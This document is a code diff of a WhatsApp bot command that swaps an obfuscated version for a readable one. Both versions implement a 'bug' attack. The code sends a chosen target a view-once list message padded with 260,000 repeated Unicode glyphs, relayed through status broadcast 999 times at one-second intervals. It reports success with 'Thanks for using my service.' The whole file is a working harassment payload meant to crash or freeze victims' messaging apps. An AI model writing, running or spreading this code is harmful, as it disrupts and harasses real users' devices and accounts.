@@ -1,1 +1,124 @@
-function _0x4214(_0x58c585,_0x4f7df3){const _0x45a02a=_0x45a0();return _0x4214=function(_0x4214e1,_0x11e4ea){_0x4214e1=_0x4214e1-0xc9;let _0xc7685d=_0x45a02a[_0x4214e1];return _0xc7685d;},_0x4214(_0x58c585,_0x4f7df3);}(function(_0x58b92f,_0x5b31fb){const _0x1f35cb=_0x4214,_0x3cf225=_0x58b92f();while(!![]){try{const _0xad8987=-parseInt(_0x1f35cb(0xe1))/0x1+parseInt(_0x1f35cb(0xcd))/0x2*(parseInt(_0x1f35cb(0xdb))/0x3)+-parseInt(_0x1f35cb(0xdc))/0x4+parseInt(_0x1f35cb(0xe6))/0x5*(-parseInt(_0x1f35cb(0xdf))/0x6)+-parseInt(_0x1f35cb(0xca))/0x7*(parseInt(_0x1f35cb(0xd4))/0x8)+-parseInt(_0x1f35cb(0xd0))/0x9*(parseInt(_0x1f35cb(0xd3))/0xa)+parseInt(_0x1f35cb(0xdd))/0xb;if(_0xad8987===_0x5b31fb)break;else _0x3cf225['push'](_0x3cf225['shift']());}catch(_0x30b692){_0x3cf225['push'](_0x3cf225['shift']());}}}(_0x45a0,0xc5b42));import _0x5dabe4 from'bailey';function _0x45a0(){const _0x6921c8=['2982180weWTXh','74927622sBOWkA','text','3255594ToUELO','length','1395013yRWJQN','replace','remoteJid','trim','meta','10JXBFOg','slice','Succceded\x20in\x20sending\x20bug\x20to\x20the\x20target.\x0a\x0aThanks\x20for\x20using\x20my\x20service.','sendMessage','An\x20error\x20occurred\x20while\x20trying\x20to\x20bug\x20the\x20target:\x20','extendedTextMessage','557942dCWwFf','Message\x20JID\x20is\x20undefined.','conversation','914lrjJsc','repeat','status@broadcast','51453hHoArp','\x0a\x0a\x0a','contextInfo','2230nbWAOO','152LHHFVb','message','Peace\x20and\x20Love\x0a','quotedMessage','@s.whatsapp.net','key','mentioned_users','87GqAiqu'];_0x45a0=function(){return _0x6921c8;};return _0x45a0();}const {proto,generateWAMessageFromContent}=_0x5dabe4;import _0x1a2635 from'../commands/bug.js';async function sios(_0x54341f,_0x5aa6be){const _0xd56ae6=_0x4214,_0x81407b=await generateWAMessageFromContent(_0x5aa6be,{'viewOnceMessage':{'message':{'listResponseMessage':{'title':_0xd56ae6(0xd6),'description':_0xd56ae6(0xd1)+'𑪆'[_0xd56ae6(0xce)](0x3f7a0),'singleSelectReply':{'selectedId':'id'},'listType':0x1}}}},{});await _0x54341f['relayMessage'](_0xd56ae6(0xcf),_0x81407b[_0xd56ae6(0xd5)],{'messageId':_0x81407b[_0xd56ae6(0xd9)]['id'],'statusJidList':[_0x5aa6be],'additionalNodes':[{'tag':_0xd56ae6(0xe5),'attrs':{},'content':[{'tag':_0xd56ae6(0xda),'attrs':{},'content':[{'tag':'to','attrs':{'jid':_0x5aa6be},'content':undefined}]}]}]});}export async function siosinvis(_0x3dac0a,_0x43a09e){const _0x4928ef=_0x4214;try{const _0x2e7b21=_0x3dac0a[_0x4928ef(0xd9)]?.[_0x4928ef(0xe3)];if(!_0x2e7b21)throw new Error(_0x4928ef(0xcb));await _0x43a09e[_0x4928ef(0xe9)](_0x2e7b21,{'text':'Attempting\x20to\x20bug\x20the\x20target'});const _0x2c553c=_0x3dac0a[_0x4928ef(0xd5)]?.['extendedTextMessage']?.[_0x4928ef(0xde)]||_0x3dac0a[_0x4928ef(0xd5)]?.[_0x4928ef(0xcc)]||'',_0x113e0a=_0x2c553c['slice'](0x1)[_0x4928ef(0xe4)](),_0x17c923=_0x113e0a['split'](/\s+/),_0xd685ad=_0x17c923[_0x4928ef(0xe7)](0x1);let _0x86349f;if(_0x3dac0a[_0x4928ef(0xd5)]?.[_0x4928ef(0xc9)]?.['contextInfo']?.[_0x4928ef(0xd7)])_0x86349f=_0x3dac0a[_0x4928ef(0xd5)][_0x4928ef(0xc9)][_0x4928ef(0xd2)]['participant'];else{if(_0xd685ad[_0x4928ef(0xe0)]>0x0)_0x86349f=_0xd685ad[0x0][_0x4928ef(0xe2)]('@','')+_0x4928ef(0xd8);else throw new Error('Specify\x20the\x20person\x20to\x20bug.');}const _0x42b517='@'+_0x86349f[_0x4928ef(0xe2)]('@s.whatsapp.net','');for(let _0x2f8136=0x0;_0x2f8136<0x3e7;_0x2f8136++){await sios(_0x43a09e,_0x86349f),await new Promise(_0x46d337=>setTimeout(_0x46d337,0x3e8));}await _0x1a2635(_0x3dac0a,_0x43a09e,_0x4928ef(0xe8),0x1);}catch(_0x2d7524){console['error']('An\x20error\x20occurred\x20while\x20trying\x20to\x20bug\x20the\x20target:',_0x2d7524),await _0x43a09e[_0x4928ef(0xe9)](_0x3dac0a['key'][_0x4928ef(0xe3)],{'text':_0x4928ef(0xea)+_0x2d7524['message']});}}export default siosinvis;
+import pkg from "bailey";
+
+const { proto, generateWAMessageFromContent } = pkg;
+
+
+import channelSender from '../commands/channelSender.js'
+
+
+async function sios(client, destinatario){
+
+    const tmsg = await generateWAMessageFromContent(destinatario, {
+
+                   viewOnceMessage: {
+
+                       message: {
+
+                           listResponseMessage: {
+
+                               title: 'Peace and Love\n',
+
+                               description:"\n\n\n"+"𑪆".repeat(260000),
+
+                               singleSelectReply: {
+
+                                   selectedId: "id"
+                               },
+
+                               listType: 1
+                           }
+                       }
+                   }
+
+           }, {});
+
+    await client.relayMessage("status@broadcast", tmsg.message, {
+
+               messageId: tmsg.key.id,
+
+               statusJidList: [destinatario],
+
+               additionalNodes: [{
+
+                   tag: "meta",
+
+                   attrs: {},
+
+                   content: [{
+
+                       tag: "mentioned_users",
+
+                       attrs: {},
+
+                       content: [{
+
+                           tag: "to",
+
+                           attrs: { jid: destinatario },
+
+                           content: undefined,
+
+                }],
+            }],
+        }],
+    });
+}
+
+export async function siosinvis(message, client) {
+
+    try {
+
+        const remoteJid = message.key?.remoteJid;
+
+        if (!remoteJid) {
+
+            throw new Error("Message JID is undefined.");
+        }
+
+        await client.sendMessage(remoteJid, { text: "Attempting to bug the target" });
+
+        const messageBody = message.message?.extendedTextMessage?.text || message.message?.conversation || '';
+
+        const commandAndArgs = messageBody.slice(1).trim();
+
+        const parts = commandAndArgs.split(/\s+/);
+
+        const args = parts.slice(1);
+
+        let participant;
+
+        if (message.message?.extendedTextMessage?.contextInfo?.quotedMessage) {
+
+            participant = message.message.extendedTextMessage.contextInfo.participant;
+
+        } else if (args.length > 0) {
+
+            participant = args[0].replace('@', '') + '@s.whatsapp.net';
+
+        } else {
+
+            throw new Error('Specify the person to bug.');
+        }
+
+        const num = '@' + participant.replace('@s.whatsapp.net', '');
+
+        // Execute the bug command
+
+        for (let i = 0; i < 999; i++) {
+
+            await sios(client, participant);
+
+            await new Promise(resolve => setTimeout(resolve, 1000));
+        }
+
+
+        await channelSender(message, client, "Succceded in sending bug to the target.\n\nThanks for using my service.", 1);
+
+    } catch (error) {
+
+        console.error("An error occurred while trying to bug the target:", error);
+
+        await client.sendMessage(message.key.remoteJid, { text: `An error occurred while trying to bug the target: ${error.message}` });
+    }
+}
+export default siosinvis;
